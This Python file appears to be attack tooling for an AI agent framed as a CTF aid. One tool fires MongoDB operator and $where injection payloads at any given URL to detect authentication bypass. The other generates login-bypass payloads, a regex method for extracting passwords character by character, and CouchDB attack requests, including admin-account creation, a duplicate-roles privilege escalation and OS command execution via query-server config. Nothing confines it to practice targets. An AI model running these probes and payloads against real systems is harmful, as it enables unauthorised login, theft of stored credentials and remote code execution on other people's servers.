"""
NoSQL Injection testing tools for CTF solving.

Provides automated MongoDB-style NoSQL injection detection, aggregation
pipeline injection, and CouchDB-specific payload generation.
"""

import json
import re
from typing import Dict, List, Optional, Tuple

import requests


class NosqlProbeTool:
    """
    NosqlProbeTool: Test MongoDB-style NoSQL injection vulnerabilities.

    Tool interface (FAIR-style):
      - `name` and `description` class attributes.
      - `.use(tool_input: str) -> str`, where tool_input is JSON.

    Expected JSON tool_input format:

        {
          "url": "http://target.com/login",
          "param": "username",
          "method": "POST",
          "data": {"password": "test"},
          "injection_type": "both",
          "timeout": 10
        }

    Injection types:
      - query_param: Injects via query parameters using bracket notation
      - json_body: Injects via JSON request body with operator objects
      - both: Tests both injection modes (default)

    Required: url, param.
    Optional: method (default POST), data, injection_type (default both), timeout (default 10).
    """

    name: str = "nosql_probe"
    description: str = (
        "Test MongoDB-style NoSQL injection vulnerabilities by sending operator-based "
        "payloads via query parameters (bracket notation) and JSON body (operator objects). "
        "Input must be JSON with keys: 'url' (target URL), 'param' (parameter to inject into). "
        "Optional: 'method' ('GET' or 'POST', default 'POST'), 'data' (other form data), "
        "'injection_type' ('query_param', 'json_body', or 'both', default 'both'), "
        "'timeout' (default 10). Returns analysis of which payloads triggered NoSQL errors, "
        "authentication bypasses, or response differentials."
    )

    # Query parameter payloads: appended to param name via bracket notation
    QUERY_PARAM_PAYLOADS: List[Tuple[str, str]] = [
        ("[$ne]=", "$ne (not equal) operator"),
        ("[$gt]=", "$gt (greater than) operator"),
        ("[$regex]=.*", "$regex wildcard match"),
        ("[$exists]=true", "$exists operator"),
        ("[$nin][]=", "$nin (not in) operator"),
    ]

    # JSON body payloads: replace the parameter value with an operator object
    JSON_BODY_PAYLOADS: List[Tuple[dict, str]] = [
        ({"$ne": ""}, "$ne (not equal) empty string"),
        ({"$gt": ""}, "$gt (greater than) empty string"),
        ({"$regex": ".*"}, "$regex wildcard match"),
        ({"$nin": []}, "$nin empty array"),
        ({"$exists": True}, "$exists true"),
    ]

    # JavaScript injection payloads for $where
    WHERE_PAYLOADS: List[Tuple[str, str]] = [
        ("this.password.match(/.*/)", "$where regex match"),
        ("function(){return true}", "$where function true"),
        ("1==1", "$where equality true"),
    ]


    # Aggregation pipeline injection payloads
    AGGREGATION_PAYLOADS: List[Tuple[dict, str]] = [
        (
            {"$lookup": {"from": "users", "localField": "_id", "foreignField": "_id", "as": "leaked"}},
            "$lookup cross-collection data extraction",
        ),
        (
            {"$addFields": {"isAdmin": True}},
            "$addFields inject computed fields",
        ),
        (
            {"$group": {"_id": None, "$push": "$$ROOT"}},
            "$group + $push aggregate all documents",
        ),
        (
            {"$match": {"$where": "return true"}},
            "$match with $where JavaScript execution",
        ),
    ]

    # NoSQL error indicators
    ERROR_INDICATORS: List[str] = [
        "MongoError",
        "BSONObj",
        "MongoServerError",
        "$operator",
        "invalid operator",
        "SyntaxError",
    ]

    # Success indicators for auth bypass
    SUCCESS_INDICATORS: List[str] = [
        "welcome",
        "dashboard",
        "admin",
        "logged in",
        "login successful",
        "profile",
        "logout",
        "flag",
        "ctf{",
        "picoctf{",
        "htb{",
        "thm{",
    ]

    # Flag patterns
    FLAG_PATTERNS: List[str] = [
        r"(picoCTF\{[^}]+\})",
        r"(picoctf\{[^}]+\})",
        r"(HTB\{[^}]+\})",
        r"(htb\{[^}]+\})",
        r"(THM\{[^}]+\})",
        r"(thm\{[^}]+\})",
        r"(FLAG\{[^}]+\})",
        r"(flag\{[^}]+\})",
        r"(CTF\{[^}]+\})",
        r"(ctf\{[^}]+\})",
    ]

    def __init__(self, session: Optional[requests.Session] = None) -> None:
        self.session = session or requests.Session()

    def _detect_errors(self, response_text: str) -> List[str]:
        """Detect NoSQL error indicators in response text."""
        found = []
        for indicator in self.ERROR_INDICATORS:
            if indicator.lower() in response_text.lower():
                found.append(indicator)
        return found

    def _detect_success(self, response_text: str) -> List[str]:
        """Detect success indicators in response text."""
        found = []
        text_lower = response_text.lower()
        for indicator in self.SUCCESS_INDICATORS:
            if indicator.lower() in text_lower:
                found.append(indicator)
        return found

    def _extract_flag(self, response_text: str) -> Optional[str]:
        """Try to extract a CTF flag from response."""
        for pattern in self.FLAG_PATTERNS:
            match = re.search(pattern, response_text)
            if match:
                return match.group(1)
        return None

    def _test_query_param_injection(
        self,
        url: str,
        method: str,
        param: str,
        form_data: Dict,
        timeout: int,
        baseline_status: int,
        baseline_length: int,
    ) -> Tuple[List[Dict], List[str], List[str]]:
        """Test query parameter bracket notation injection."""
        interesting = []
        errors_found = []
        flags_found = []

        for payload_suffix, desc in self.QUERY_PARAM_PAYLOADS:
            # Build query string with bracket notation
            injected_param = f"{param}{payload_suffix}"
            test_data = dict(form_data)

            try:
                if method == "GET":
                    # For GET, inject into query string
                    params = dict(form_data)
                    # Remove the original param and add the injected one
                    params.pop(param, None)
                    params[injected_param] = ""
                    resp = self.session.get(url, params=params, timeout=timeout)
                else:
                    # For POST, inject into form data
                    post_data = dict(form_data)
                    post_data.pop(param, None)
                    post_data[injected_param] = ""
                    resp = self.session.post(url, data=post_data, timeout=timeout)

                resp_text = resp.text
                resp_length = len(resp_text)
                resp_status = resp.status_code

                # Analyze response
                nosql_errors = self._detect_errors(resp_text)
                success_indicators = self._detect_success(resp_text)
                flag = self._extract_flag(resp_text)

                is_interesting = False
                reasons = []

                if nosql_errors:
                    is_interesting = True
                    reasons.append(f"NoSQL errors: {', '.join(nosql_errors)}")
                    errors_found.extend(nosql_errors)

                if success_indicators:
                    is_interesting = True
                    reasons.append(f"Success indicators: {', '.join(success_indicators)}")

                length_diff = abs(resp_length - baseline_length)
                if length_diff > 100 and resp_length > baseline_length:
                    is_interesting = True
                    reasons.append(f"Length diff: +{length_diff} bytes")

                if resp_status != baseline_status and resp_status == 200:
                    is_interesting = True
                    reasons.append(f"Status changed: {baseline_status} -> {resp_status}")

                if flag:
                    is_interesting = True
                    reasons.append(f"FLAG FOUND: {flag}")
                    flags_found.append(flag)

                if is_interesting:
                    interesting.append({
                        "payload": f"{param}{payload_suffix}",
                        "type": "query_param",
                        "desc": desc,
                        "status": resp_status,
                        "length": resp_length,
                        "reasons": reasons,
                    })

            except Exception:
                pass

        return interesting, errors_found, flags_found

    def _test_json_body_injection(
        self,
        url: str,
        method: str,
        param: str,
        form_data: Dict,
        timeout: int,
        baseline_status: int,
        baseline_length: int,
    ) -> Tuple[List[Dict], List[str], List[str]]:
        """Test JSON body operator injection."""
        interesting = []
        errors_found = []
        flags_found = []

        for payload_obj, desc in self.JSON_BODY_PAYLOADS:
            json_data = dict(form_data)
            json_data[param] = payload_obj

            try:
                if method == "GET":
                    resp = self.session.get(
                        url, params={param: json.dumps(payload_obj)}, timeout=timeout
                    )
                else:
                    resp = self.session.post(
                        url, json=json_data, timeout=timeout
                    )

                resp_text = resp.text
                resp_length = len(resp_text)
                resp_status = resp.status_code

                # Analyze response
                nosql_errors = self._detect_errors(resp_text)
                success_indicators = self._detect_success(resp_text)
                flag = self._extract_flag(resp_text)

                is_interesting = False
                reasons = []

                if nosql_errors:
                    is_interesting = True
                    reasons.append(f"NoSQL errors: {', '.join(nosql_errors)}")
                    errors_found.extend(nosql_errors)

                if success_indicators:
                    is_interesting = True
                    reasons.append(f"Success indicators: {', '.join(success_indicators)}")

                length_diff = abs(resp_length - baseline_length)
                if length_diff > 100 and resp_length > baseline_length:
                    is_interesting = True
                    reasons.append(f"Length diff: +{length_diff} bytes")

                if resp_status != baseline_status and resp_status == 200:
                    is_interesting = True
                    reasons.append(f"Status changed: {baseline_status} -> {resp_status}")

                if flag:
                    is_interesting = True
                    reasons.append(f"FLAG FOUND: {flag}")
                    flags_found.append(flag)

                if is_interesting:
                    interesting.append({
                        "payload": json.dumps(payload_obj),
                        "type": "json_body",
                        "desc": desc,
                        "status": resp_status,
                        "length": resp_length,
                        "reasons": reasons,
                    })

            except Exception:
                pass

        return interesting, errors_found, flags_found

    def _test_where_injection(
        self,
        url: str,
        method: str,
        param: str,
        form_data: Dict,
        timeout: int,
        baseline_status: int,
        baseline_length: int,
    ) -> Tuple[List[Dict], List[str], List[str]]:
        """Test $where JavaScript injection payloads."""
        interesting = []
        errors_found = []
        flags_found = []

        for where_payload, desc in self.WHERE_PAYLOADS:
            json_data = dict(form_data)
            json_data["$where"] = where_payload

            try:
                if method == "GET":
                    params = dict(form_data)
                    params["$where"] = where_payload
                    resp = self.session.get(url, params=params, timeout=timeout)
                else:
                    resp = self.session.post(url, json=json_data, timeout=timeout)

                resp_text = resp.text
                resp_length = len(resp_text)
                resp_status = resp.status_code

                nosql_errors = self._detect_errors(resp_text)
                success_indicators = self._detect_success(resp_text)
                flag = self._extract_flag(resp_text)

                is_interesting = False
                reasons = []

                if nosql_errors:
                    is_interesting = True
                    reasons.append(f"NoSQL errors: {', '.join(nosql_errors)}")
                    errors_found.extend(nosql_errors)

                if success_indicators:
                    is_interesting = True
                    reasons.append(f"Success indicators: {', '.join(success_indicators)}")

                length_diff = abs(resp_length - baseline_length)
                if length_diff > 100 and resp_length > baseline_length:
                    is_interesting = True
                    reasons.append(f"Length diff: +{length_diff} bytes")

                if resp_status != baseline_status and resp_status == 200:
                    is_interesting = True
                    reasons.append(f"Status changed: {baseline_status} -> {resp_status}")

                if flag:
                    is_interesting = True
                    reasons.append(f"FLAG FOUND: {flag}")
                    flags_found.append(flag)

                if is_interesting:
                    interesting.append({
                        "payload": f"$where: {where_payload}",
                        "type": "$where",
                        "desc": desc,
                        "status": resp_status,
                        "length": resp_length,
                        "reasons": reasons,
                    })

            except requests.exceptions.Timeout:
                interesting.append({
                    "payload": f"$where: {where_payload}",
                    "type": "$where",
                    "desc": desc,
                    "status": "TIMEOUT",
                    "length": 0,
                    "reasons": ["Request timed out - possible $where sleep injection"],
                })
            except Exception:
                pass

        return interesting, errors_found, flags_found

    def _test_aggregation_injection(
        self,
        url: str,
        method: str,
        param: str,
        form_data: Dict,
        timeout: int,
        baseline_status: int,
        baseline_length: int,
    ) -> Tuple[List[Dict], List[str], List[str]]:
        """Test aggregation pipeline injection payloads ($lookup, $addFields, etc.)."""
        interesting = []
        errors_found = []
        flags_found = []

        for payload_obj, desc in self.AGGREGATION_PAYLOADS:
            json_data = dict(form_data)
            json_data[param] = payload_obj

            try:
                if method == "GET":
                    resp = self.session.get(
                        url,
                        params={param: json.dumps(payload_obj)},
                        timeout=timeout,
                    )
                else:
                    resp = self.session.post(url, json=json_data, timeout=timeout)

                resp_text = resp.text
                resp_length = len(resp_text)
                resp_status = resp.status_code

                nosql_errors = self._detect_errors(resp_text)
                success_indicators = self._detect_success(resp_text)
                flag = self._extract_flag(resp_text)

                is_interesting = False
                reasons = []

                if nosql_errors:
                    is_interesting = True
                    reasons.append(f"NoSQL errors: {', '.join(nosql_errors)}")
                    errors_found.extend(nosql_errors)

                if success_indicators:
                    is_interesting = True
                    reasons.append(
                        f"Success indicators: {', '.join(success_indicators)}"
                    )

                length_diff = abs(resp_length - baseline_length)
                if length_diff > 100 and resp_length > baseline_length:
                    is_interesting = True
                    reasons.append(f"Length diff: +{length_diff} bytes")

                if resp_status != baseline_status and resp_status == 200:
                    is_interesting = True
                    reasons.append(
                        f"Status changed: {baseline_status} -> {resp_status}"
                    )

                if flag:
                    is_interesting = True
                    reasons.append(f"FLAG FOUND: {flag}")
                    flags_found.append(flag)

                if is_interesting:
                    interesting.append(
                        {
                            "payload": json.dumps(payload_obj),
                            "type": "aggregation",
                            "desc": desc,
                            "status": resp_status,
                            "length": resp_length,
                            "reasons": reasons,
                        }
                    )

            except Exception:
                pass

        return interesting, errors_found, flags_found

    def use(self, tool_input: str) -> str:
        # Parse JSON input
        try:
            data = json.loads(tool_input) if tool_input else {}
        except json.JSONDecodeError as exc:
            return f"[NosqlProbeTool] Error: Invalid JSON input. {exc}"

        # Validate required fields
        url = data.get("url")
        if not url or not isinstance(url, str):
            return "[NosqlProbeTool] Error: 'url' (string) is required."

        param = data.get("param")
        if not param or not isinstance(param, str):
            return "[NosqlProbeTool] Error: 'param' (string) is required."

        method = (data.get("method") or "POST").upper()
        if method not in ("GET", "POST"):
            return "[NosqlProbeTool] Error: 'method' must be 'GET' or 'POST'."

        injection_type = data.get("injection_type", "both")
        if injection_type not in ("query_param", "json_body", "both"):
            return "[NosqlProbeTool] Error: 'injection_type' must be 'query_param', 'json_body', or 'both'."

        form_data = data.get("data") or {}
        timeout = data.get("timeout", 10)

        # Get baseline response
        baseline_data = {**form_data, param: "test_baseline_value"}
        try:
            if method == "GET":
                baseline_resp = self.session.get(url, params=baseline_data, timeout=timeout)
            else:
                baseline_resp = self.session.post(url, data=baseline_data, timeout=timeout)
            baseline_length = len(baseline_resp.text)
            baseline_status = baseline_resp.status_code
        except Exception as exc:
            return f"[NosqlProbeTool] Error: Could not get baseline response: {exc}"

        # Collect all results
        all_interesting: List[Dict] = []
        all_errors: List[str] = []
        all_flags: List[str] = []

        # Test query param injection
        if injection_type in ("query_param", "both"):
            interesting, errors, flags = self._test_query_param_injection(
                url, method, param, form_data, timeout,
                baseline_status, baseline_length,
            )
            all_interesting.extend(interesting)
            all_errors.extend(errors)
            all_flags.extend(flags)

        # Test JSON body injection
        if injection_type in ("json_body", "both"):
            interesting, errors, flags = self._test_json_body_injection(
                url, method, param, form_data, timeout,
                baseline_status, baseline_length,
            )
            all_interesting.extend(interesting)
            all_errors.extend(errors)
            all_flags.extend(flags)

        # Test $where injection (always tested)
        interesting, errors, flags = self._test_where_injection(
            url, method, param, form_data, timeout,
            baseline_status, baseline_length,
        )
        all_interesting.extend(interesting)
        all_errors.extend(errors)
        all_flags.extend(flags)

        # Test aggregation pipeline injection (always tested with JSON body)
        if injection_type in ("json_body", "both"):
            interesting, errors, flags = self._test_aggregation_injection(
                url, method, param, form_data, timeout,
                baseline_status, baseline_length,
            )
            all_interesting.extend(interesting)
            all_errors.extend(errors)
            all_flags.extend(flags)

        # Build output
        output_lines = [
            "[NosqlProbeTool] NoSQL Injection Probe Results",
            "=" * 50,
            f"Target: {url}",
            f"Method: {method}",
            f"Parameter: {param}",
            f"Injection Type: {injection_type}",
            f"Baseline Status: {baseline_status}",
            f"Baseline Length: {baseline_length} bytes",
            "",
        ]

        # Flags found
        if all_flags:
            output_lines.append("!!! FLAGS FOUND !!!")
            for flag in all_flags:
                output_lines.append(f"  {flag}")
            output_lines.append("")

        # Interesting payloads
        if all_interesting:
            output_lines.append(f"INTERESTING PAYLOADS ({len(all_interesting)} found):")
            output_lines.append("-" * 40)
            for item in all_interesting:
                output_lines.append(f"  Payload: {item['payload']}")
                output_lines.append(f"    Type: {item['type']}")
                output_lines.append(f"    Description: {item['desc']}")
                output_lines.append(f"    Status: {item['status']}, Length: {item['length']}")
                for reason in item["reasons"]:
                    output_lines.append(f"    -> {reason}")
                output_lines.append("")
        else:
            output_lines.append("No obviously interesting payloads found.")
            output_lines.append("Consider trying different injection types or manual testing.")
            output_lines.append("")

        # Error indicators detected
        unique_errors = list(set(all_errors))
        if unique_errors:
            output_lines.append("NoSQL ERROR INDICATORS DETECTED:")
            for err in unique_errors:
                output_lines.append(f"  [!] {err}")
            output_lines.append("")

        # Summary
        output_lines.append("SUMMARY:")
        output_lines.append(f"  NoSQL Errors Triggered: {len(unique_errors)}")
        output_lines.append(f"  Interesting Payloads: {len(all_interesting)}")
        output_lines.append(f"  Flags Found: {len(all_flags)}")

        # Recommendations
        output_lines.append("")
        output_lines.append("RECOMMENDATIONS:")
        if all_interesting:
            output_lines.append("  - NoSQL injection likely! Try authentication bypass payloads.")
            output_lines.append("  - Use nosql_payload_generator for complete bypass payloads.")
            output_lines.append("  - Try regex-based data extraction with $regex operator.")
        else:
            output_lines.append("  - No clear NoSQL injection detected.")
            output_lines.append("  - Try different parameters or injection types.")
            output_lines.append("  - Check if the application uses parameterized queries.")

        return "\n".join(output_lines)


class NosqlPayloadGenerator:
    """
    NosqlPayloadGenerator: Generate NoSQL injection payloads for common attack scenarios.

    Pure payload generation - no HTTP session required.

    Tool interface (FAIR-style):
      - `name` and `description` class attributes.
      - `.use(tool_input: str) -> str`, where tool_input is JSON.

    Expected JSON tool_input format:

        {
          "operation": "auth_bypass",
          "target_field": "username",
          "known_prefix": "adm"
        }

    Operations:
      - auth_bypass: Complete login bypass payloads for MongoDB
      - data_extraction: Regex-based character extraction methodology
      - operators: Reference of all MongoDB query operators
      - couchdb: CouchDB-specific payloads and techniques
    """

    name: str = "nosql_payload_generator"
    description: str = (
        "Generate NoSQL injection payloads for common attack scenarios. "
        "Input must be JSON with key 'operation': 'auth_bypass' (MongoDB login bypass), "
        "'data_extraction' (regex-based blind extraction), 'operators' (MongoDB operator "
        "reference), or 'couchdb' (CouchDB-specific payloads and techniques). Optional: "
        "'target_field' (field name to target), 'known_prefix' (known prefix for data "
        "extraction). No HTTP session needed - pure payload generation."
    )

    # MongoDB query operators reference
    OPERATORS: List[Dict[str, str]] = [
        {"operator": "$eq", "description": "Matches values equal to a specified value", "example": '{"field": {"$eq": "value"}}'},
        {"operator": "$ne", "description": "Matches values not equal to a specified value", "example": '{"field": {"$ne": ""}}'},
        {"operator": "$gt", "description": "Matches values greater than a specified value", "example": '{"field": {"$gt": ""}}'},
        {"operator": "$gte", "description": "Matches values greater than or equal to a specified value", "example": '{"field": {"$gte": ""}}'},
        {"operator": "$lt", "description": "Matches values less than a specified value", "example": '{"field": {"$lt": "~"}}'},
        {"operator": "$lte", "description": "Matches values less than or equal to a specified value", "example": '{"field": {"$lte": "~"}}'},
        {"operator": "$in", "description": "Matches any of the values specified in an array", "example": '{"field": {"$in": ["admin", "root"]}}'},
        {"operator": "$nin", "description": "Matches none of the values specified in an array", "example": '{"field": {"$nin": []}}'},
        {"operator": "$regex", "description": "Matches values via regular expression", "example": '{"field": {"$regex": "^admin"}}'},
        {"operator": "$exists", "description": "Matches documents that have the specified field", "example": '{"field": {"$exists": true}}'},
        {"operator": "$type", "description": "Matches documents where field is a specified BSON type", "example": '{"field": {"$type": "string"}}'},
        {"operator": "$where", "description": "Matches documents that satisfy a JavaScript expression", "example": '{"$where": "this.field == true"}'},
    ]

    def __init__(self) -> None:
        pass

    def _generate_auth_bypass(self, target_field: Optional[str] = None) -> str:
        """Generate authentication bypass payloads."""
        output_lines = [
            "=== NoSQL Authentication Bypass Payloads ===",
            "",
            "--- JSON Body Format ---",
            "(Send as Content-Type: application/json)",
            "",
        ]

        json_payloads = [
            {
                "desc": "Bypass both fields with $ne (not equal to empty string)",
                "payload": {"username": {"$ne": ""}, "password": {"$ne": ""}},
            },
            {
                "desc": "Target specific user 'admin' with $ne password bypass",
                "payload": {"username": "admin", "password": {"$ne": ""}},
            },
            {
                "desc": "Greater-than bypass (matches all non-empty values)",
                "payload": {"username": {"$gt": ""}, "password": {"$gt": ""}},
            },
            {
                "desc": "Regex wildcard bypass (matches any string)",
                "payload": {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}},
            },
            {
                "desc": "Target admin with regex password bypass",
                "payload": {"username": "admin", "password": {"$regex": ".*"}},
            },
            {
                "desc": "$nin empty array bypass (not in empty list = always true)",
                "payload": {"username": {"$nin": []}, "password": {"$nin": []}},
            },
            {
                "desc": "$exists bypass (field exists = always true for non-null)",
                "payload": {"username": {"$exists": True}, "password": {"$exists": True}},
            },
            {
                "desc": "Regex starts-with admin",
                "payload": {"username": {"$regex": "^admin"}, "password": {"$ne": ""}},
            },
        ]

        if target_field:
            # Add targeted payloads
            json_payloads.append({
                "desc": f"Target field '{target_field}' with $ne",
                "payload": {target_field: {"$ne": ""}, "password": {"$ne": ""}},
            })

        for i, entry in enumerate(json_payloads, 1):
            output_lines.append(f"{i}. {entry['desc']}")
            output_lines.append(f"   {json.dumps(entry['payload'])}")
            output_lines.append("")

        output_lines.append("--- Query Parameter Format ---")
        output_lines.append("(For URL-encoded form submissions)")
        output_lines.append("")

        query_payloads = [
            ("username[$ne]=&password[$ne]=", "$ne bypass via query params"),
            ("username[$gt]=&password[$gt]=", "$gt bypass via query params"),
            ("username[$regex]=.*&password[$regex]=.*", "$regex bypass via query params"),
            ("username=admin&password[$ne]=", "Target admin with $ne password"),
            ("username[$nin][]=&password[$nin][]=", "$nin bypass via query params"),
            ("username[$exists]=true&password[$exists]=true", "$exists bypass via query params"),
        ]

        for i, (payload, desc) in enumerate(query_payloads, len(json_payloads) + 1):
            output_lines.append(f"{i}. {desc}")
            output_lines.append(f"   {payload}")
            output_lines.append("")

        output_lines.append("--- JavaScript $where Injection ---")
        output_lines.append("")
        where_payloads = [
            ('{"$where": "return true"}', "Always-true JavaScript condition"),
            ('{"$where": "this.password.match(/.*/)"}', "Regex match on password field"),
            ('{"$where": "function(){return true}"}', "Function returning true"),
            ('{"$where": "1==1"}', "Simple equality that is always true"),
        ]

        for i, (payload, desc) in enumerate(where_payloads, 1):
            output_lines.append(f"  {i}. {desc}")
            output_lines.append(f"     {payload}")
            output_lines.append("")

        return "\n".join(output_lines)

    def _generate_data_extraction(
        self, target_field: Optional[str] = None, known_prefix: Optional[str] = None
    ) -> str:
        """Generate regex-based data extraction payloads."""
        field = target_field or "password"
        prefix = known_prefix or ""

        output_lines = [
            "=== NoSQL Regex-Based Data Extraction ===",
            "",
            "--- Methodology ---",
            "Use $regex to extract data character by character via boolean response differences.",
            f"Target field: {field}",
            f"Known prefix: '{prefix}' ({len(prefix)} chars known)",
            "",
            "--- Step 1: Confirm injection works ---",
            f'  Send: {{"{field}": {{"$regex": ".*"}}}}',
            "  Expected: successful response (matches any value)",
            "",
            "--- Step 2: Extract characters iteratively ---",
            "  For each position, test each printable character:",
            "",
        ]

        # Generate extraction templates
        if prefix:
            output_lines.append(f"  Starting from known prefix: '{prefix}'")
            output_lines.append(f"  Next character test payloads:")
            output_lines.append("")

            # Show test payloads for next character after prefix
            test_chars = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_-{}"
            for c in test_chars[:10]:  # Show first 10 as examples
                escaped = re.escape(prefix + c)
                output_lines.append(
                    f'    {{"{field}": {{"$regex": "^{escaped}"}}}}'
                )
            output_lines.append(f"    ... (continue for all printable characters)")
            output_lines.append("")
        else:
            output_lines.append("  First character test payloads:")
            output_lines.append("")
            test_chars = "abcdefghijklmnopqrstuvwxyz0123456789"
            for c in test_chars[:10]:  # Show first 10 as examples
                output_lines.append(
                    f'    {{"{field}": {{"$regex": "^{c}"}}}}'
                )
            output_lines.append(f"    ... (continue for all printable characters)")
            output_lines.append("")

        output_lines.append("--- Step 3: Binary approach for faster extraction ---")
        output_lines.append("  Instead of testing each character, use regex ranges:")
        output_lines.append(f'    {{"{field}": {{"$regex": "^{re.escape(prefix)}[a-m]"}}}}  -> narrows to first or second half')
        output_lines.append(f'    {{"{field}": {{"$regex": "^{re.escape(prefix)}[a-g]"}}}}  -> further narrow')
        output_lines.append("  Continue binary splitting until single character is found.")
        output_lines.append("")

        output_lines.append("--- Step 4: Determine value length ---")
        output_lines.append(f'  {{"{field}": {{"$regex": "^.{{1}}$"}}}}   -> test if exactly 1 char')
        output_lines.append(f'  {{"{field}": {{"$regex": "^.{{5}}$"}}}}   -> test if exactly 5 chars')
        output_lines.append(f'  {{"{field}": {{"$regex": "^.{{10}}$"}}}}  -> test if exactly 10 chars')
        output_lines.append("")

        output_lines.append("--- Common $regex patterns ---")
        regex_patterns = [
            (f'"^{re.escape(prefix)}a"', "Tests if next char is 'a'"),
            (f'"^{re.escape(prefix)}[a-z]"', "Tests if next char is lowercase letter"),
            (f'"^{re.escape(prefix)}[0-9]"', "Tests if next char is digit"),
            (f'"^{re.escape(prefix)}[A-Z]"', "Tests if next char is uppercase letter"),
            ('".*flag.*"', "Tests if value contains 'flag'"),
            ('".*admin.*"', "Tests if value contains 'admin'"),
            ('"^.{1,10}$"', "Tests if value length is 1-10 chars"),
        ]

        for pattern, desc in regex_patterns:
            output_lines.append(f"  $regex: {pattern}")
            output_lines.append(f"    -> {desc}")
            output_lines.append("")

        return "\n".join(output_lines)

    def _generate_operators_reference(self) -> str:
        """Generate MongoDB operators reference."""
        output_lines = [
            "=== MongoDB Query Operators Reference ===",
            "",
        ]

        for op in self.OPERATORS:
            output_lines.append(f"Operator: {op['operator']}")
            output_lines.append(f"  Description: {op['description']}")
            output_lines.append(f"  Example: {op['example']}")
            output_lines.append("")

        output_lines.append("=== Usage in NoSQL Injection ===")
        output_lines.append("")
        output_lines.append("1. Authentication Bypass:")
        output_lines.append('   {"username": {"$ne": ""}, "password": {"$ne": ""}}')
        output_lines.append('   Matches any document where username and password are not empty.')
        output_lines.append("")
        output_lines.append("2. Data Extraction:")
        output_lines.append('   {"username": "admin", "password": {"$regex": "^a"}}')
        output_lines.append('   Tests if admin password starts with "a".')
        output_lines.append("")
        output_lines.append("3. Enumeration:")
        output_lines.append('   {"username": {"$regex": "^.{5}$"}}')
        output_lines.append('   Finds usernames that are exactly 5 characters long.')
        output_lines.append("")
        output_lines.append("4. JavaScript Injection:")
        output_lines.append('   {"$where": "this.role == \'admin\'"}')
        output_lines.append('   Matches documents where role field equals admin.')

        return "\n".join(output_lines)

    def use(self, tool_input: str) -> str:
        # Parse JSON input
        try:
            data = json.loads(tool_input) if tool_input else {}
        except json.JSONDecodeError as exc:
            return f"[NosqlPayloadGenerator] Error: Invalid JSON input. {exc}"

        operation = data.get("operation", "").strip()
        valid_ops = ("auth_bypass", "data_extraction", "operators", "couchdb")
        if not operation:
            return (
                "[NosqlPayloadGenerator] Error: 'operation' is required. "
                f"Must be one of: {', '.join(valid_ops)}."
            )

        if operation not in valid_ops:
            return (
                f"[NosqlPayloadGenerator] Error: Invalid operation '{operation}'. "
                f"Must be one of: {', '.join(valid_ops)}."
            )

        target_field = data.get("target_field")
        known_prefix = data.get("known_prefix")

        output_lines = [
            "[NosqlPayloadGenerator] NoSQL Injection Payloads",
            "=" * 50,
            f"Operation: {operation}",
            "",
        ]

        if operation == "auth_bypass":
            output_lines.append(self._generate_auth_bypass(target_field))

        elif operation == "data_extraction":
            output_lines.append(self._generate_data_extraction(target_field, known_prefix))

        elif operation == "operators":
            output_lines.append(self._generate_operators_reference())

        elif operation == "couchdb":
            output_lines.append(self._generate_couchdb_payloads())

        return "\n".join(output_lines)

    def _generate_couchdb_payloads(self) -> str:
        """Generate CouchDB-specific injection payloads."""
        lines = [
            "=== CouchDB-Specific Payloads ===",
            "",
            "--- Endpoint Discovery ---",
            "  GET /          -> Server info (version, etc.)",
            "  GET /_all_dbs  -> List all databases",
            "  GET /{db}/_all_docs  -> List all documents",
            "  GET /{db}/_all_docs?include_docs=true  -> All docs with content",
            "  GET /_config    -> Server configuration (admin party check)",
            "  GET /_users/_all_docs  -> User database",
            "  GET /_session   -> Current session info",
            "",
            "--- Authentication Bypass ---",
            "",
            "1. Admin Party (no admin configured):",
            "   PUT /_config/admins/hacker -d '\"password\"'",
            "   (Creates a new admin account if admin party is enabled)",
            "",
            "2. Cookie authentication bypass:",
            '   POST /_session -d \'{"name":"admin","password":"admin"}\'',
            "   -H 'Content-Type: application/json'",
            "",
            "--- View-Based Data Extraction ---",
            "",
            "3. Mango query injection (CouchDB 2.x+):",
            '   POST /{db}/_find -d \'{"selector": {"$gt": null}}\'',
            '   POST /{db}/_find -d \'{"selector": {"password": {"$regex": ".*"}}}\'',
            "",
            "4. JavaScript view injection (if views enabled):",
            '   PUT /{db}/_design/exploit -d \'{"views":{"dump":{"map":"function(doc){emit(doc._id,doc)}"}}}\'',
            "   GET /{db}/_design/exploit/_view/dump",
            "",
            "--- Document Manipulation ---",
            "",
            "5. Create/modify documents:",
            '   PUT /{db}/evil_doc -d \'{"admin": true, "role": "admin"}\'',
            '   POST /{db} -d \'{"_id": "admin", "password": "hacked"}\'',
            "",
            "6. Delete documents (with revision):",
            "   DELETE /{db}/{doc_id}?rev={revision}",
            "",
            "--- CouchDB Erlang RCE (CVE-2017-12635/12636) ---",
            "",
            "7. Privilege escalation (duplicate roles):",
            '   PUT /_users/org.couchdb.user:evil -d \'{"type":"user",'
            '"name":"evil","roles":["_admin"],"roles":[],"password":"pass"}\'',
            "   (Duplicate 'roles' key exploit in older versions)",
            "",
            "8. OS command execution (CouchDB < 3.x with config access):",
            "   PUT /_config/query_servers/cmd -d '\"id >/tmp/out\"'",
            "   POST /{db}/_temp_view?limit=1 -d "
            "'{\"language\":\"cmd\",\"map\":\"\"}'",
        ]
        return "\n".join(lines)
